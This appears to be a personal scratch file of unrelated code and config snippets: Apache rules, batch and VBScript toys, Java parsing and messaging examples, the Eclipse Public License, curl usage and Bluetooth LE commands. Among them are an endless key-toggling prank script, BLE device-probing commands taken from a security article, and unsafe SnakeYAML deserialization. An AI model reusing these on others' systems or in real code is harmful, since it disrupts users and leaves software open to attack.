crit - There are problems that need to be critically addressed.
alert - Prompt action is required.
emerg - The system is in an unusable state and requires immediate attention.

awk '{print $9}' access.log | sort | uniq -c | sort -rn
awk '($9 ~ /302/)' access.log | awk '{print $7}' | sort | uniq -c | sort -rn
--------------------------------------------------------------------------------------------------------
ErrorDocument 403 /forbidden.html
ErrorDocument 404 /notfound.html
ErrorDocument 500 /servererror.html

Header set X-Custom "Custom Value"

order allow,deny
deny from 255.x.x.x
deny from 123.x.x.x
allow from all

RewriteCond %{HTTP_REFERER} unwanteddomain\.com [NC,OR]
RewriteCond %{HTTP_REFERER} unwanteddomain2\.com
RewriteRule .* - [F]

AddType image/gif .gif .GIF

## EXPIRES CACHING ##
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg "access 1 year"
    ExpiresByType image/jpeg "access 1 year"
    ExpiresByType image/gif "access 1 year"
    ExpiresByType image/png "access 1 year"
    ExpiresByType text/css "access 1 month"
    ExpiresByType text/html "access 1 month"
    ExpiresByType application/pdf "access 1 month"
    ExpiresByType text/x-javascript "access 1 month"
    ExpiresByType application/x-shockwave-flash "access 1 month"
    ExpiresByType image/x-icon "access 1 year"
    ExpiresDefault "access 1 month"
</IfModule>
## EXPIRES CACHING ##

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
    AddOutputFilterByType DEFLATE application/x-font
    AddOutputFilterByType DEFLATE application/x-font-opentype
    AddOutputFilterByType DEFLATE application/x-font-otf
    AddOutputFilterByType DEFLATE application/x-font-truetype
    AddOutputFilterByType DEFLATE application/x-font-ttf
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE font/opentype
    AddOutputFilterByType DEFLATE font/otf
    AddOutputFilterByType DEFLATE font/ttf
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE image/x-icon
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/xml
</IfModule>

RewriteCond %{REQUEST_METHOD} !^(HEAD|OPTIONS|POST|PUT)
RewriteRule .* - [F]

Redirect 301 https://yourwebsite.com/old-page https://yourwebsite.com/new-page

<IfModule mod_headers.c>
    <FilesMatch "\.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$">
        Header set Access-Control-Allow-Origin "*"
    </FilesMatch>
</IfModule>

<img srcset="image1-730x365.png 730w,
             image1-380x190.png 380w,
             image1-768x384.png 768w,
             image1-1024x512.png 1024w,
             image1-730x365@2x.png 1460w,
             image1-380x190@2x.png 760w"
     sizes="(max-width: 730px) 100vw,
            730px"
     src="image1-730x365.png" width="730" height="365"
<img srcset="image1-730x365.webp 730w,
             image1-380x190.webp 380w,
             image1-768x384.webp 768w,
             image1-1024x512.webp 1024w,
             image1-730x365@2x.webp 1460w,
             image1-380x190@2x.webp 760w"
     sizes="(max-width: 730px) 100vw,
            730px"
     src="image1-730x365.webp" width="730" height="365">
--------------------------------------------------------------------------------------------------------
@echo off
color 02
:tricks
echo %random%%random%%random%%random%%random%%random%%random%%random%
goto tricks
--------------------------------------------------------------------------------------------------------
.LOG
--------------------------------------------------------------------------------------------------------
Dim Message, Speak
Message=InputBox("Enter text","Speak")
Set Speak=CreateObject("sapi.spvoice")
Speak.Speak Message
--------------------------------------------------------------------------------------------------------
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wshshell.sendkeys "{NUMLOCK}"
wshshell.sendkeys "{SCROLLLOCK}"
loop
--------------------------------------------------------------------------------------------------------
@echo off
color 0e
title Guessing Game by seJma
set /a guessnum=0
set /a answer=%RANDOM%
set variable1=surf33
echo -------------------------------------------------
echo Welcome to the Guessing Game!
echo.
echo Try and Guess my Number!
echo -------------------------------------------------
echo.
:top
echo.
set /p guess=
echo.
if %guess% GTR %answer% ECHO Lower!
if %guess% LSS %answer% ECHO Higher!
if %guess%==%answer% GOTO EQUAL
set /a guessnum=%guessnum% +1
if %guess%==%variable1% ECHO Found the backdoor hey?, the answer is: %answer%
goto top
:equal
echo Congratulations, You guessed right!!!
echo.
echo It took you %guessnum% guesses.
echo.
pause
--------------------------------------------------------------------------------------------------------
language: java
jdk:
  - oraclejdk8
sudo: false
before_install:
  - git config user.name "$GIT_NAME"
  - git config user.email "$GIT_EMAIL"
  - git config credential.helper "store --file=.git/credentials"
  - echo "https://$GH_TOKEN:@github.com" > .git/credentials
  - gem install asciidoctor
install:
- ./mvnw install -P docs -q -U -DskipTests=true -Dmaven.test.redirectTestOutputToFile=true
- 'if [ "${TRAVIS_PULL_REQUEST}" = "false" ] && [ "${TRAVIS_BRANCH}" = "master" ]; then ./docs/src/main/asciidoc/ghpages.sh; fi'
env:
  global:
  - GIT_NAME="Spencer Gibb"
  - GIT_EMAIL=sgibb@pivotal.io
  - CI_DEPLOY_USERNAME=sgibb
  - secure: dxec/7oFht2WMaw4GNFNvuWHlnkm1wmFagE3ZrtCcU2SHUW/P2FgG5tiNW9hT2eXHf2H0YUF1ROkL4BrH5qpIlOBtYd0J8Q/67vBqyB112IN2FqoB/F6Erkfp1FKMBBrXXYaGoSvqzmJs6zqS3JRpyr010W2aU8klK0QfqRoJ0g=
  - TERM=dumb
script: |
  echo "Current Branch: ${TRAVIS_BRANCH}"
  echo "Pull Request: ${TRAVIS_PULL_REQUEST}"
  if [ "${TRAVIS_BRANCH}" = master ] && [ "${TRAVIS_PULL_REQUEST}" = "false" ]; then
    echo "[Publishing] Pushing snapshot to Sonatype"
    ./mvnw -s .settings.xml deploy -nsu
  else
    echo "[Installing] Intalling snapshot to local maven repo"
    ./mvnw install -nsu
  fi
--------------------------------------------------------------------------------------------------------
Locale locale = new Locale("pl", "PL");
ResourceBundle exampleBundle = ResourceBundle.getBundle("package.ExampleResource", locale);
 
assertEquals(exampleBundle.getString("currency"), "polish zloty");
assertEquals(exampleBundle.getObject("toUsdRate"), new BigDecimal("3.401")); 
assertArrayEquals(exampleBundle.getStringArray("cities"), new String[]{"Warsaw", "Cracow"});


    Label_pl_PL_UNIX
    Label_pl_PL
    Label_pl
    Label_en_US
    Label_en
    Label

#resource.properties
cancelButton = cancel
 
#resource_pl.properties
continueButton = dalej
 
#resource_pl_PL.properties
backButton = cofnij

native2ascii -encoding UTF-8 utf8.properties nonUtf8.properties
--------------------------------------------------------------------------------------------------------
@echo off
:Start2
cls
goto Start
:Start
title Password Generator
echo I will make you a new password.
echo Please write the password down somewhere in case you forget it.
echo ----------------------------------------¬-----------------------
echo 1) 1 Random Password
echo 2) 5 Random Passwords
echo 3) 10 Random Passwords
echo Input your choice
set input=
set /p input= Choice:
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
if %input%==3 goto C if NOT goto Start2
:A
cls
echo Your password is %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:Exit
exit
:B
cls
echo Your 5 passwords are %random%, %random%, %random%, %random%, %random%.
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:C
cls
echo Your 10 Passwords are %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
--------------------------------------------------------------------------------------------------------
@echo off
title Batch Calculator by seJma
color 1f
:top
echo --------------------------------------------------------------
echo Welcome to Batch Calculator
echo --------------------------------------------------------------
echo.
set /p sum=
set /a ans=%sum%
echo.
echo = %ans%
echo --------------------------------------------------------------
pause
cls
echo Previous Answer: %ans%
goto top
pause
exit
--------------------------------------------------------------------------------------------------------
	private static String toHash(Object obj) {
		return (obj == null ? "" : "@" + Integer.toHexString(System.identityHashCode(obj)));
	}
--------------------------------------------------------------------------------------------------------
java -Xmx64m -server \
  -cp target/classes:target/test-classes:lib/\* \
-Xrunhprof:cpu=samples,depth=10,verbose=n,interval=2 \
--------------------------------------------------------------------------------------------------------
System.out.println(ReflectionToStringBuilder.toString(user, ToStringStyle.MULTI_LINE_STYLE));
--------------------------------------------------------------------------------------------------------
GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
--------------------------------------------------------------------------------------------------------
String propertiesFilename = "server.properties";
Properties prop = new Properties();
try (var inputStream = getClass().getClassLoader().getResourceAsStream(propertiesFilename)) {
    if (inputStream == null) {
        throw new FileNotFoundException(propertiesFilename);
    }
    prop.load(inputStream);
} catch (IOException e) {
    throw new RuntimeException(
                "Could not read " + propertiesFilename + " resource file: " + e);
}
--------------------------------------------------------------------------------------------------------
public class BookYAMLParser implements Parser<Book> {
    String filename;

    public BookYAMLParser(String filename) {
        this.filename = filename;
    }

    @Override
    public void serialize(Book book) {
        try {
            DumperOptions options = new DumperOptions();
            options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            Yaml yaml = new Yaml(options);
            FileWriter writer = new FileWriter(filename);
            yaml.dump(book, writer);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Book deserialize() {
        try {
            InputStream input = new FileInputStream(new File(filename));
            Yaml yaml = new Yaml();
            Book data = (Book) yaml.load(input);
            input.close();

            return data;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (YamlException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            String message = "Exception in file " + filename + ", ";
            throw new Exception(message + e.getMessage());
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
public class BookJSONParser implements Parser<Book> {

    String filename;
    public BookJSONParser(String filename) {
        this.filename = filename;
    }

    @Override
    public void serialize(Book book) {
        Gson gson = new GsonBuilder().setPrettyPrinting().create();;

        try {
            FileWriter writer = new FileWriter(filename);
            String json = gson.toJson(book);
            writer.write(json);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Book deserialize() {
        Gson gson = new Gson();

        try {
            BufferedReader br = new BufferedReader(
                    new FileReader(filename));

            JsonReader jsonReader = new JsonReader(br);
            Book book = gson.fromJson(jsonReader, Book.class);
            return book;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
package com.javasampleapproach.java9flow.pubsub;
 
public class MainApp {
 
  public static void main(String[] args) throws InterruptedException {
    
    MyPublisher publisher = new MyPublisher();
    MySubscriber subscriberA = new MySubscriber("A");
    MySubscriber subscriberB = new MySubscriber("B");
    
    publisher.subscribe(subscriberA);
    publisher.subscribe(subscriberB);
    
    publisher.waitUntilTerminated();
  }
}

package com.javasampleapproach.java9flow.pubprocsub;
 
public class MainApp {
 
  public static void main(String[] args) throws InterruptedException {
    
    MyPublisher publisher = new MyPublisher();
    
    MySubscriber subscriber = new MySubscriber();
    subscriber.setDEMAND(...); // MUST set number of items to be requested here!
    
    MyProcessor processor = new MyProcessor();
    processor.setDEMAND(...); // MUST set number of items to be requested here!
    
    publisher.subscribe(processor);
    processor.subscribe(subscriber);
    
    publisher.waitUntilTerminated();
    
  }
}

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
 
public class MainApp {
 
  public static void main(String[] args) {
 
    final int MAX_BUFFER_CAPACITY = 128;
    final ExecutorService executor = Executors.newFixedThreadPool(4);
 
    MyPublisher publisher = new MyPublisher(executor, MAX_BUFFER_CAPACITY, 200, TimeUnit.MILLISECONDS);
    
    MySubscriber subscriberA = new MySubscriber("A");
    subscriberA.setDEMAND(3);
 
    MySubscriber subscriberB = new MySubscriber("B");
    subscriberB.setDEMAND(6);
 
    publisher.subscribe(subscriberA);
    publisher.subscribe(subscriberB);
  }
}
package com.javasampleapproach.java9flow.submissionpublisher;
 
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
 
public class MainApp {
 
  public static void main(String[] args) {
 
    final int MAX_BUFFER_CAPACITY = 128;
    final ExecutorService executor = Executors.newFixedThreadPool(4);
 
    MyPublisher publisher = new MyPublisher(executor, MAX_BUFFER_CAPACITY, 200, TimeUnit.MILLISECONDS);
 
    publisher.consume((data) -> process(data));
  }
 
  static void process(Integer i) {
    System.out.println("consume() testing: " + i.toString());
  }
}
--------------------------------------------------------------------------------------------------------
import org.yaml.snakeyaml.Yaml;

import java.io.IOException;
import java.io.InputStream;

public class LoadAsJavaObjectList {

    public static void main(String[] args) throws IOException {
        Yaml yaml = new Yaml();
        try (InputStream in = LoadAsJavaObject.class.getResourceAsStream("/persons.yml")) {
            Persons persons = yaml.loadAs(in, Persons.class);
            for (Person person : persons.getPersons()) {
                System.out.println(person);
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
 
import javax.naming.InitialContext;                                                                          
import javax.jms.Topic;
import javax.jms.Session;
import javax.jms.TextMessage;
import javax.jms.TopicPublisher;
import javax.jms.DeliveryMode;
import javax.jms.TopicSession;
import javax.jms.TopicConnection;
import javax.jms.TopicConnectionFactory;
                                                                            
public class Publisher
{
    public static void main(String[] args) throws Exception
    {
       // get the initial context
       InitialContext ctx = new InitialContext();
                                                                           
       // lookup the topic object
       Topic topic = (Topic) ctx.lookup("topic/topic0");
                                                                           
       // lookup the topic connection factory
       TopicConnectionFactory connFactory = (TopicConnectionFactory) ctx.
           lookup("topic/connectionFactory");
                                                                           
       // create a topic connection
       TopicConnection topicConn = connFactory.createTopicConnection();
                                                                           
       // create a topic session
       TopicSession topicSession = topicConn.createTopicSession(false,
           Session.AUTO_ACKNOWLEDGE);
                                                                           
       // create a topic publisher
       TopicPublisher topicPublisher = topicSession.createPublisher(topic);
       topicPublisher.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
                                                                           
       // create the "Hello World" message
       TextMessage message = topicSession.createTextMessage();
       message.setText("Hello World");
                                                                           
       // publish the messages
       topicPublisher.publish(message);
                                                                           
       // print what we did
       System.out.println("Message published: " + message.getText());
                                                                           
       // close the topic connection
       topicConn.close();
    }
}
import javax.naming.InitialContext;                                                                          
import javax.jms.Topic;
import javax.jms.Session;
import javax.jms.TextMessage;
import javax.jms.TopicSession;
import javax.jms.TopicSubscriber;
import javax.jms.TopicConnection;
import javax.jms.TopicConnectionFactory;
                                                                            
public class Subscriber
{
    public static void main(String[] args) throws Exception
    {
       // get the initial context
       InitialContext ctx = new InitialContext();
                                                                           
       // lookup the topic object
       Topic topic = (Topic) ctx.lookup("topic/topic0");
                                                                           
       // lookup the topic connection factory
       TopicConnectionFactory connFactory = (TopicConnectionFactory) ctx.
           lookup("topic/connectionFactory");
                                                                           
       // create a topic connection
       TopicConnection topicConn = connFactory.createTopicConnection();
                                                                           
       // create a topic session
       TopicSession topicSession = topicConn.createTopicSession(false,
           Session.AUTO_ACKNOWLEDGE);
                                                                           
       // create a topic subscriber
       TopicSubscriber topicSubscriber = topicSession.createSubscriber(topic);
                                                                           
       // start the connection
       topicConn.start();
                                                                           
       // receive the message
       TextMessage message = (TextMessage) topicSubscriber.receive();
                                                                           
       // print the message
       System.out.println("Message received: " + message.getText());
                                                                           
       // close the topic connection
       topicConn.close();
    }
}

--------------------------------------------------------------------------------------------------------
check if single element is in a collection
1
2
3
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasItem("cd"));
assertThat(collection, not(hasItem("zz")));

check if multiple elements are in a collection
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasItems("cd", "ef"));

check all elements in a collection

– with strict order
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, contains("ab", "cd", "ef"));

– with any order
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, containsInAnyOrder("cd", "ab", "ef"));

check if collection is empty
1
2
	
List<String> collection = Lists.newArrayList();
assertThat(collection, empty());

check if array is empty
1
2
	
String[] array = new String[] { "ab" };
assertThat(array, not(emptyArray()));

check if Map is empty
1
2
	
Map<String, String> collection = Maps.newHashMap();
assertThat(collection, equalTo(Collections.EMPTY_MAP));

check if Iterable is empty
1
2
	
Iterable<String> collection = Lists.newArrayList();
assertThat(collection, emptyIterable());

check size of a collection
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasSize(3));

checking size of an iterable
1
2
	
Iterable<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, Matchers.<String> iterableWithSize(3));

check condition on every item
1
2
	
List<Integer> collection = Lists.newArrayList(15, 20, 25, 30);
assertThat(collection, everyItem(greaterThan(10)));
--------------------------------------------------------------------------------------------------------
    @Size(min = 5, message ="The name '${validatedValue}' must be at least {min}" +
                        " characters long. Length found : ${validatedValue.length()}")
    private String name;
	
     Validator validator = getValidator();
     validator.validate(testBean).stream().forEach(ValidatedValueExample::printError);
--------------------------------------------------------------------------------------------------------
sudo hcitool lescan

Подключение к BLE устройство через Mac адрес и получение списка служб и дескрипторов:

sudo gatttool -b YOUR_MAC -I -t random

Подробнее: https://www.securitylab.ru/analytics/499344.php
sudo hciconfig hci0 reset

Подробнее: https://www.securitylab.ru/analytics/499344.php
--------------------------------------------------------------------------------------------------------
	@Override
	public <C> C unwrap(Class<C> type) {
		// Keep backward compatibility
		if ( type.isAssignableFrom( ConstraintViolation.class ) ) {
			return type.cast( this );
		}
		if ( type.isAssignableFrom( HibernateConstraintViolation.class ) ) {
			return type.cast( this );
		}
		throw LOG.getTypeNotSupportedForUnwrappingException( type );
	}
--------------------------------------------------------------------------------------------------------
assertThat(strings, 
   allOf(
     iterableWithSize(greaterThan(2)),
     hasItem("string two")
   )
);
--------------------------------------------------------------------------------------------------------
    public static void main(String[] args) {

        try (InputStream input = App3.class.getClassLoader().getResourceAsStream("config.properties")) {

            Properties prop = new Properties();

            if (input == null) {
                System.out.println("Sorry, unable to find config.properties");
                return;
            }

            //load a properties file from class path, inside static method
            prop.load(input);

            //get the property value and print it out
            System.out.println(prop.getProperty("db.url"));
            System.out.println(prop.getProperty("db.user"));
            System.out.println(prop.getProperty("db.password"));

        } catch (IOException ex) {
            ex.printStackTrace();
        }

    }
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class LoadContacts {

  private static String yamlLocation = "path_to/../contacts.yml";

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper(new YAMLFactory());

    try {
      List<Contact> contactList = mapper.readValue(new File(yamlLocation), new TypeReference<List<Contact>>(){});
      contactList.forEach(System.out::println);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
--------------------------------------------------------------------------------------------------------
Eclipse Public License - v 2.0
==============================

THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE PUBLIC LICENSE (“AGREEMENT”). ANY USE, REPRODUCTION OR DISTRIBUTION OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.

### 1. Definitions

“Contribution” means:
* **a)** in the case of the initial Contributor, the initial content Distributed under this Agreement, and
* **b)** in the case of each subsequent Contributor:
	* **i)** changes to the Program, and
	* **ii)** additions to the Program;
where such changes and/or additions to the Program originate from and are Distributed by that particular Contributor. A Contribution “originates” from a Contributor if it was added to the Program by such Contributor itself or anyone acting on such Contributor's behalf. Contributions do not include changes or additions to the Program that are not Modified Works.

“Contributor” means any person or entity that Distributes the Program.

“Licensed Patents” mean patent claims licensable by a Contributor which are necessarily infringed by the use or sale of its Contribution alone or when combined with the Program.

“Program” means the Contributions Distributed in accordance with this Agreement.

“Recipient” means anyone who receives the Program under this Agreement or any Secondary License (as applicable), including Contributors.

“Derivative Works” shall mean any work, whether in Source Code or other form, that is based on (or derived from) the Program and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship.

“Modified Works” shall mean any work in Source Code or other form that results from an addition to, deletion from, or modification of the contents of the Program, including, for purposes of clarity any new file in Source Code form that contains any contents of the Program. Modified Works shall not include works that contain only declarations, interfaces, types, classes, structures, or files of the Program solely in each case in order to link to, bind by name, or subclass the Program or Modified Works thereof.

“Distribute” means the acts of **a)** distributing or **b)** making available in any manner that enables the transfer of a copy.

“Source Code” means the form of a Program preferred for making modifications, including but not limited to software source code, documentation source, and configuration files.

“Secondary License” means either the GNU General Public License, Version 2.0, or any later versions of that license, including any exceptions or additional permissions as identified by the initial Contributor.

### 2. Grant of Rights

**a)** Subject to the terms of this Agreement, each Contributor hereby grants Recipient a non-exclusive, worldwide, royalty-free copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, Distribute and sublicense the Contribution of such Contributor, if any, and such Derivative Works.

**b)** Subject to the terms of this Agreement, each Contributor hereby grants Recipient a non-exclusive, worldwide, royalty-free patent license under Licensed Patents to make, use, sell, offer to sell, import and otherwise transfer the Contribution of such Contributor, if any, in Source Code or other form. This patent license shall apply to the combination of the Contribution and the Program if, at the time the Contribution is added by the Contributor, such addition of the Contribution causes such combination to be covered by the Licensed Patents. The patent license shall not apply to any other combinations which include the Contribution. No hardware per se is licensed hereunder.

**c)** Recipient understands that although each Contributor grants the licenses to its Contributions set forth herein, no assurances are provided by any Contributor that the Program does not infringe the patent or other intellectual property rights of any other entity. Each Contributor disclaims any liability to Recipient for claims brought by any other entity based on infringement of intellectual property rights or otherwise. As a condition to exercising the rights and licenses granted hereunder, each Recipient hereby assumes sole responsibility to secure any other intellectual property rights needed, if any. For example, if a third party patent license is required to allow Recipient to Distribute the Program, it is Recipient's responsibility to acquire that license before distributing the Program.

**d)** Each Contributor represents that to its knowledge it has sufficient copyright rights in its Contribution, if any, to grant the copyright license set forth in this Agreement.

**e)** Notwithstanding the terms of any Secondary License, no Contributor makes additional grants to any Recipient (other than those set forth in this Agreement) as a result of such Recipient's receipt of the Program under the terms of a Secondary License (if permitted under the terms of Section 3).

### 3. Requirements

**3.1** If a Contributor Distributes the Program in any form, then:

* **a)** the Program must also be made available as Source Code, in accordance with section 3.2, and the Contributor must accompany the Program with a statement that the Source Code for the Program is available under this Agreement, and informs Recipients how to obtain it in a reasonable manner on or through a medium customarily used for software exchange; and

* **b)** the Contributor may Distribute the Program under a license different than this Agreement, provided that such license:
	* **i)** effectively disclaims on behalf of all other Contributors all warranties and conditions, express and implied, including warranties or conditions of title and non-infringement, and implied warranties or conditions of merchantability and fitness for a particular purpose;
	* **ii)** effectively excludes on behalf of all other Contributors all liability for damages, including direct, indirect, special, incidental and consequential damages, such as lost profits;
	* **iii)** does not attempt to limit or alter the recipients' rights in the Source Code under section 3.2; and
	* **iv)** requires any subsequent distribution of the Program by any party to be under a license that satisfies the requirements of this section 3.

**3.2** When the Program is Distributed as Source Code:

* **a)** it must be made available under this Agreement, or if the Program **(i)** is combined with other material in a separate file or files made available under a Secondary License, and **(ii)** the initial Contributor attached to the Source Code the notice described in Exhibit A of this Agreement, then the Program may be made available under the terms of such Secondary Licenses, and
* **b)** a copy of this Agreement must be included with each copy of the Program.

**3.3** Contributors may not remove or alter any copyright, patent, trademark, attribution notices, disclaimers of warranty, or limitations of liability (“notices”) contained within the Program from any copy of the Program which they Distribute, provided that Contributors may add their own appropriate notices.

### 4. Commercial Distribution

Commercial distributors of software may accept certain responsibilities with respect to end users, business partners and the like. While this license is intended to facilitate the commercial use of the Program, the Contributor who includes the Program in a commercial product offering should do so in a manner which does not create potential liability for other Contributors. Therefore, if a Contributor includes the Program in a commercial product offering, such Contributor (“Commercial Contributor”) hereby agrees to defend and indemnify every other Contributor (“Indemnified Contributor”) against any losses, damages and costs (collectively “Losses”) arising from claims, lawsuits and other legal actions brought by a third party against the Indemnified Contributor to the extent caused by the acts or omissions of such Commercial Contributor in connection with its distribution of the Program in a commercial product offering. The obligations in this section do not apply to any claims or Losses relating to any actual or alleged intellectual property infringement. In order to qualify, an Indemnified Contributor must: **a)** promptly notify the Commercial Contributor in writing of such claim, and **b)** allow the Commercial Contributor to control, and cooperate with the Commercial Contributor in, the defense and any related settlement negotiations. The Indemnified Contributor may participate in any such claim at its own expense.

For example, a Contributor might include the Program in a commercial product offering, Product X. That Contributor is then a Commercial Contributor. If that Commercial Contributor then makes performance claims, or offers warranties related to Product X, those performance claims and warranties are such Commercial Contributor's responsibility alone. Under this section, the Commercial Contributor would have to defend claims against the other Contributors related to those performance claims and warranties, and if a court requires any other Contributor to pay any damages as a result, the Commercial Contributor must pay those damages.

### 5. No Warranty

EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, AND TO THE EXTENT PERMITTED BY APPLICABLE LAW, THE PROGRAM IS PROVIDED ON AN “AS IS” BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, EITHER EXPRESS OR IMPLIED INCLUDING, WITHOUT LIMITATION, ANY WARRANTIES OR CONDITIONS OF TITLE, NON-INFRINGEMENT, MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE. Each Recipient is solely responsible for determining the appropriateness of using and distributing the Program and assumes all risks associated with its exercise of rights under this Agreement, including but not limited to the risks and costs of program errors, compliance with applicable laws, damage to or loss of data, programs or equipment, and unavailability or interruption of operations.

### 6. Disclaimer of Liability

EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, AND TO THE EXTENT PERMITTED BY APPLICABLE LAW, NEITHER RECIPIENT NOR ANY CONTRIBUTORS SHALL HAVE ANY LIABILITY FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING WITHOUT LIMITATION LOST PROFITS), HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OR DISTRIBUTION OF THE PROGRAM OR THE EXERCISE OF ANY RIGHTS GRANTED HEREUNDER, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

### 7. General

If any provision of this Agreement is invalid or unenforceable under applicable law, it shall not affect the validity or enforceability of the remainder of the terms of this Agreement, and without further action by the parties hereto, such provision shall be reformed to the minimum extent necessary to make such provision valid and enforceable.

If Recipient institutes patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Program itself (excluding combinations of the Program with other software or hardware) infringes such Recipient's patent(s), then such Recipient's rights granted under Section 2(b) shall terminate as of the date such litigation is filed.

All Recipient's rights under this Agreement shall terminate if it fails to comply with any of the material terms or conditions of this Agreement and does not cure such failure in a reasonable period of time after becoming aware of such noncompliance. If all Recipient's rights under this Agreement terminate, Recipient agrees to cease use and distribution of the Program as soon as reasonably practicable. However, Recipient's obligations under this Agreement and any licenses granted by Recipient relating to the Program shall continue and survive.

Everyone is permitted to copy and distribute copies of this Agreement, but in order to avoid inconsistency the Agreement is copyrighted and may only be modified in the following manner. The Agreement Steward reserves the right to publish new versions (including revisions) of this Agreement from time to time. No one other than the Agreement Steward has the right to modify this Agreement. The Eclipse Foundation is the initial Agreement Steward. The Eclipse Foundation may assign the responsibility to serve as the Agreement Steward to a suitable separate entity. Each new version of the Agreement will be given a distinguishing version number. The Program (including Contributions) may always be Distributed subject to the version of the Agreement under which it was received. In addition, after a new version of the Agreement is published, Contributor may elect to Distribute the Program (including its Contributions) under the new version.

Except as expressly stated in Sections 2(a) and 2(b) above, Recipient receives no rights or licenses to the intellectual property of any Contributor under this Agreement, whether expressly, by implication, estoppel or otherwise. All rights in the Program not expressly granted under this Agreement are reserved. Nothing in this Agreement is intended to be enforceable by any entity that is not a Contributor or Recipient. No third-party beneficiary rights are created under this Agreement.

#### Exhibit A - Form of Secondary Licenses Notice

> “This Source Code may also be made available under the following Secondary Licenses when the conditions for such availability set forth in the Eclipse Public License, v. 2.0 are satisfied: {name license(s), version(s), and exceptions or additional permissions here}.”

Simply including a copy of this Agreement, including this Exhibit A is not sufficient to license the Source Code under Secondary Licenses.

If it is not possible or desirable to put the notice in a particular file, then You may include the notice in a location (such as a LICENSE file in a relevant directory) where a recipient would be likely to look for such a notice.

You may add additional accurate notices of copyright ownership.

--------------------------------------------------------------------------------------------------------
curl -I https://www.keycdn.com/
curl -o myfile.css https://cdn.keycdn.com/css/animate.min.css
curl -O https://cdn.keycdn.com/css/animate.min.css
curl -H "X-Header: Value" https://www.keycdn.com/
curl -H "X-Header: Value" https://www.keycdn.com/ -v
curl -C - -O https://cdn.keycdn.com/img/cdn-stats.png
curl -D - https://www.keycdn.com/
curl -D - https://www.keycdn.com/ -o /dev/null
curl --limit-rate 200K -O https://cdn.keycdn.com/img/cdn-stats.png
curl -I --http2 https://cdn.keycdn.com/
curl -r 0-20000 -o myfile.png https://cdn.keycdn.com/img/cdn-stats.png
curl --request GET https://www.keycdn.com/
curl -X POST http://www.yourwebsite.com/login/ -d 'username=yourusername&password=yourpassword'
--------------------------------------------------------------------------------------------------------
vi /lightdm/lightdm.conf
allow-guest=false

service lightdm restart
--------------------------------------------------------------------------------------------------------
vi /etc/default/grub
GRUB_RECORDFAIL_TIMEOUT=0

update-grub
